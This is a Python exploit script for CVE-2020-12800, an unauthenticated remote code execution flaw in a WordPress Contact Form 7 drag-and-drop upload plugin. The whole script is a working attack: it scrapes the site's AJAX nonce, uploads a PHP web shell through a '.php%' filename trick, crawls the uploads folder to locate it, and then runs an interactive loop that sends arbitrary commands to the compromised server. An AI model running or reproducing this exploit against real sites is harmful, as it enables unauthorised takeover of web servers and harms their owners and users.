#!/usr/bin/python
import string
import random
import requests
from bs4 import BeautifulSoup
import sys

payloadurl=""
def RecurseLinks(base,file):

    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"}
    f = requests.get(base, headers=headers)
    soup = BeautifulSoup(f.content, "html.parser")

    for root in soup.find_all("a"):
        href = root.get("href")
        if (href.startswith("/")):
            do = "nothing"
        elif (href.endswith("/")):
            RecurseLinks(base + href, file)
        else:
            if file in href:
                print ("\n[+] File Found --> " + base + href)
                global payloadurl
                payloadurl = (base+href)

def main():
    #os.system('cls')
    print("WordPress Plugin \'Drag and Drop Multiple File Upload - Contact Form 7\' 1.3.3.2 - Unauthenticated Remote Code Execution")
    print("@amartinsec --> Twitter\nCVE:2020-12800\n")

    #Build The Request
    #Generate random URL for filename
    file = ''.join(random.sample((string.ascii_uppercase + string.digits), 6))

    urlinput = raw_input("[+] Enter url to the vulnerable WordPress application: ")

    #Finding the nonce used in the Ajax security string
    print ("\n[+] Searching for security string nonce")
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'}
    homepage = requests.get(urlinput,headers=headers)
    homepage = homepage.text
    homepage = homepage.split("ajax_nonce\":\"",1)[1]
    securitykey = homepage[:10]
    print("[+] Found security string --> " + securitykey)

    url = urlinput + "/wp-admin/admin-ajax.php"

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
                     "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5",
                     "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
                     "Content-Type": "multipart/form-data; boundary=---------------------------350278735926454076983690555601",
                     }
    data = "-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"supported_type\"\r\n\r\n" \
           "php%\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"size_limit\"\r\n\r\n" \
           "5242880\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n" \
           "dnd_codedropz_upload\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"type" \
           "\"\r\n\r\nclick\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"security\"\r" \
           "\n\r\n" + securitykey +"\r\n-----------------------------350278735926454076983690555601\r\nContent-Disposition: form-data; name=\"upload-file\"; " \
           "filename=\"" + file +".php%\"\r\nContent-Type: text/plain\r\n\r\n" \
           "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>" \
           "\r\n-----------------------------350278735926454076983690555601--\r\n"

    print "\n[+] Sending payload to target"

    response = requests.post(url, headers=headers, data=data)

    if "200" in str(response):
        print("[+] Looks like a successful file upload!\n")


    elif "403" in str(response):
        print("\nFile Upload Failed")
        print("403 in response. Check security string")
        sys.exit(1)

    else:
        print("File upload failed. Try the manual way with Burp")
        sys.exit(1)

    print("[+] Crawling for the uploaded file. This may take a minute...")
    print("[+] Searching for " + file + ".php")

    RecurseLinks(urlinput + "/wp-content/uploads/",file)

    if payloadurl == "":
        print("Can't find the file on the web server")
        print("Try the manual method")
        sys.exit(1)

    #If all goes well, we can now send requests for RCE
    print("[+] Success\n")
    while True:
        cmd= raw_input("[+] CMD: ")
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'}
        request = requests.get(payloadurl + "?e=" + cmd, headers=headers)
        print request.text

if __name__ == "__main__":
    main()